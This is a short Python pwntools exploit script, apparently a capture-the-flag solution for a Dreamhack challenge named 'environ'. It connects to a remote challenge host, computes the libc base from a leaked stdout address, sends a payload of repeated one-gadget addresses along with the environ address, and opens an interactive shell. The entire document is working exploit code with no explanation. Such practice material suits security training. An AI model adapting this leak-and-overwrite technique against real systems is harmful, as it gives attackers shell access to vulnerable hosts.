from pwn import *
#r=process("./environ")
r=remote("host1.dreamhack.games",8260)
lib=ELF("./libc.so.6")
context.log_level='debug'
r.recvuntil(": ")
libcbase=int(r.recv(14),16)-lib.symbols['stdout']
oneshot=0xf1147+libcbase
r.sendline(str(int('0x600',16)))
pay=p64(oneshot)*160

r.sendline(pay)
r.sendline(str(libcbase+lib.symbols['environ']))
r.interactive()
